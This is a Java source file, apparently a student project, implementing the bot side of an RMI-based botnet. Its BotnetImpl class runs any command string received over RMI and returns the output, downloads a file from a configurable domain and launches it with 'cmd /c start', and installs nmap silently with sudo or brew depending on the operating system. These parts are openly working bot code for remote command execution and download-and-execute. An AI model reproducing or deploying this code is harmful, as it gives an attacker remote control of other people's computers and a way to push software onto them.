/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package model;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import rmi.IBotnet;

/**
 *
 * @author haiclover
 */
public class BotnetImpl extends UnicastRemoteObject implements IBotnet{

    private String OS;
    
    public BotnetImpl() throws RemoteException {
        
    }

    public String getOS() {
        return OS;
    }

    public void setOS(String OS) {
        this.OS = OS;
    }
    
    public void testing() throws RemoteException {
        System.out.println("This is running on client");
    }
    
    public ArrayList<String> runCommand(String cmd) throws RemoteException {
        Process process;
        ArrayList<String> arr = new ArrayList<>();
        try {
            process = Runtime.getRuntime().exec(cmd);
            BufferedReader result = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String s = null;
            while ((s = result.readLine()) != null) {
//                System.out.println(s);
                arr.add(s);
            }
        } catch (IOException ex) {
            Logger.getLogger(BotnetImpl.class.getName()).log(Level.SEVERE, null, ex);
        }
        return arr;
    }
    
     public ArrayList<String> winInstall(String command){
        try{
            // example command: install test.exe
            //example domain : http://localhost
            String domain = "";
            String[] splited = command.split("\\s");
            // example url: http://localhost/test.exe
            if (splited[0].equals("install")) {
                String urlString = domain + "/" + splited[1];
                URL url = new URL(urlString);
                String fileLocation = splited[1];
                InputStream in = url.openStream();
                File savedFile = new File(fileLocation);
                FileOutputStream fos = new FileOutputStream(savedFile);

                int length = -1;
                byte[] buffer = new byte[1024];
                while ((length = in.read(buffer)) > -1) {
                    fos.write(buffer, 0, length);
                }
                System.out.println(savedFile.getAbsolutePath());
                fos.close();
                in.close();
                // execute for windows
                String cmd = "cmd /c start " + savedFile.getAbsolutePath();
                return runCommand(cmd);
    //            Process child = Runtime.getRuntime().exec(cmd);
            }
        } catch (MalformedURLException ex) {
            Logger.getLogger(BotnetImpl.class.getName()).log(Level.SEVERE, null, ex);
        } catch (FileNotFoundException ex) {
            Logger.getLogger(BotnetImpl.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(BotnetImpl.class.getName()).log(Level.SEVERE, null, ex);
        }
        return null;
    }
    
    @Override
    public ArrayList<String> installApp() throws RemoteException {
        setOS(System.getProperty("os.name").toLowerCase());
        
        if(getOS().indexOf("linux") >= 0){
            return runCommand("sudo apt-get install nmap -y && nmap -h");
        }
        else if(getOS().indexOf("mac") >= 0){
            return runCommand("/usr/local/bin/brew install nmap");
        }
        else if(getOS().indexOf("win") >= 0){
            return winInstall("install unikey.exe");
        }
        return null;
        
    }
    
}
